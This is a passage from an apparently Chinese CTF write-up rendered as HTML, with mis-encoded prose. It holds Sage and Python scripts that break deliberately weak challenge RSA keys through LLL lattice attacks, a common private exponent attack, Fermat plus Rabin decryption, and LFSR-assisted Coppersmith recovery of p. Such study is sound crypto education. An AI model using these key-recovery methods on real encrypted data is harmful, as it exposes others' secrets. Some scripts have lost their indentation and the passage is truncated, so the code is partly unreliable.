class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**<span class="number">0.5</span>)</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [N, M1, M2, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi = (x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]*e1).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;89c63fd5-00c&#x27;</span></span><br></pre></td></tr></table></figure><p>Part2ï¼Œ3ç»„ $e$ çš„ä½è§£å¯†æŒ‡æ•°æ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">e3 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>))</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N) )</span><br><span class="line">    M3 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2))</span><br><span class="line">    M4 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">0.5</span>) )</span><br><span class="line">    M5 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2) )</span><br><span class="line">    M6 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    M7 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,    -N**<span class="number">3</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N, -e1,      <span class="number">0</span>,   e1*N,  e1*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N,   <span class="number">0</span>,   e2*N,      <span class="number">0</span>,  e2*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2,   <span class="number">0</span>, -e1*e2, -e1*e2, -e1*e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,  e3,  -e3*N,  -e3*N,  e3*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,  e1*e3,      <span class="number">0</span>, -e1*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,  e2*e3, -e2*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>, e1*e2*e3] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi_ = (e1*x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi_)</span><br><span class="line">        m = <span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:]</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;f-4ae0-b369-&#x27; </span></span><br></pre></td></tr></table></figure><p>Part3ï¼Œå…±ç§é’¥æŒ‡æ•° $d$ æ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">nl=[...]</span><br><span class="line">el=[...]</span><br><span class="line">cl=[...]</span><br><span class="line">ind=[]</span><br><span class="line">nl_s=<span class="built_in">sorted</span>(nl)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    ind.append(nl.index(nl_s[i]))</span><br><span class="line"><span class="built_in">print</span>(ind)</span><br><span class="line">e=[]</span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    e.append(el[ind[i]])</span><br><span class="line">    n.append(nl[ind[i]])</span><br><span class="line">    c.append(cl[ind[i]])</span><br><span class="line"></span><br><span class="line">M=iroot(<span class="built_in">int</span>(n[<span class="number">6</span>]),<span class="built_in">int</span>(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">a=[<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">a[<span class="number">0</span>]=[M,e[<span class="number">0</span>],e[<span class="number">1</span>],e[<span class="number">2</span>],e[<span class="number">3</span>],e[<span class="number">4</span>],e[<span class="number">5</span>],e[<span class="number">6</span>]]</span><br><span class="line">a[<span class="number">1</span>]=[<span class="number">0</span>,-n[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>]=[<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">3</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">5</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">4</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">6</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">5</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">7</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL=Mat.LLL()</span><br><span class="line">d = <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])//M</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c[<span class="number">6</span>],<span class="built_in">int</span>(d),<span class="built_in">int</span>(n[<span class="number">6</span>])))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;5a3d94a20a2c&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿æ¥å¾—flagï¼šflag{89c63fd5-00cf-4ae0-b369-5a3d94a20a2c}</p><p>â€‹    </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;????&#x27;</span></span><br><span class="line"></span><br><span class="line">z=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=sympy.nextprime(z)</span><br><span class="line">q=sympy.prevprime(<span class="number">10</span>*z)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">e=<span class="number">0xe18e</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n= ...</span></span><br><span class="line"><span class="comment">#c= ...</span></span><br></pre></td></tr></table></figure></blockquote><p>è´¹é©¬åˆ†è§£RSAï¼Œå‘ç° $\gcd(e,\varphi(n))=2$ï¼Œä»¤ $eâ€™=\frac{e}{2},mâ€™=m^2$ï¼Œ</p><p>å…ˆæ±‚å‡º $mâ€™$ï¼Œå†åˆ©ç”¨Rabinç®—æ³•æ±‚ $m$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">0xe18e</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(n//<span class="number">10</span>,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = gmpy2.next_prime(p)</span><br><span class="line">    <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e//<span class="number">2</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span></span><br><span class="line">n = p * q</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line">r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">rr = n - r</span><br><span class="line">s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">ss = n - s</span><br><span class="line"><span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">m = rabin_decrypt(mm,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;6d22773623d3d5c871692e9985de5f16&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="BABY-RSA"><a href="#BABY-RSA" class="headerlink" title="BABY-RSA"></a>BABY-RSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">num = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line">c = <span class="built_in">pow</span>(num, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;w+&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">    curnum = <span class="built_in">int</span>(hp[i])</span><br><span class="line">    (status,out)=lfsr(status,mask)</span><br><span class="line">    f.write(<span class="built_in">str</span>(curnum ^ out))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= ...</span></span><br><span class="line"><span class="string">c= ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key:</span></span><br><span class="line"><span class="string">0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA $p$ é«˜ä½æ³„éœ²æ”»å‡»+LFSRã€‚</p><p>å…ˆç”¨LFSRç»“æœå¼‚æˆ–è¿˜åŸ $p$ é«˜ä½ $hp$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&#x27;0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010&#x27;</span>)</span><br><span class="line">c=[<span class="built_in">int</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line">hp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">(status,out) = lfsr(status,mask)</span><br><span class="line">hp += <span class="built_in">str</span>(c[i]^out)</span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">int</span>(hp, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(hp)</span><br><span class="line"><span class="comment"># 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ $hp$ æœ‰568ä½ï¼Œæ ¹æ®Coppersmithå®šç†ï¼Œ1024ä½çš„ $p$ è‡³å°‘éœ€è¦é«˜576ä½æ‰èƒ½æ¢å¤å®Œæ•´ $p$ï¼Œéœ€çˆ†ç ´8ä½äºŒè¿›åˆ¶ä½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">hp = <span class="number">484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.digits + <span class="string">&quot;abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        pp = <span class="built_in">hex</span>(hp) + a + b</span><br><span class="line">        <span class="comment">#péœ€è¦ç”¨0è¡¥å…¨åˆ°1024ä½</span></span><br><span class="line">        pp += <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">        <span class="comment">#è¦åŠ çš„æ•°å­—ä¸è¡¥å…¨pæ—¶0çš„ä¸ªæ•°æœ‰å…³</span></span><br><span class="line">        pp = <span class="built_in">int</span>(pp, <span class="number">16</span>)</span><br><span class="line">        p_fake = pp+<span class="number">0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">        pbits = <span class="number">1024</span></span><br><span class="line">        kbits = pbits-<span class="number">576</span></span><br><span class="line">        pbar = p_fake &amp; (<span class="number">2</span>^pbits-<span class="number">2</span>^kbits)</span><br><span class="line">        <span class="comment">#print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits))</span></span><br><span class="line">        PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        f = x + pbar</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">            <span class="built_in">print</span>(x0 + pbar)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span>        </span><br><span class="line"><span class="comment"># 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br></pre></td></tr></table></figure><p>æœ€åå¸¸è§„RSAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">c = <span class="number">3641304537029815746727163894554557322382012539953948183406308231174259571263608621970973671202001456955622458371303424750815017578104069924877881162707673935496925529412748663209884628320657034190702348924814794263041483260377960569530869386619921425415323912964305979776909598200202236912823968867485696101691879580799000240715778010424877093758489309380968229017074542588151574195295436881889313935734282141447498134543053106463951864974512375314091440713165047188590693431938599822340588934591712592995622334522799914563528630705687647950894928965913199772209825508001274120556508220248069647851360567609656517789</span></span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = 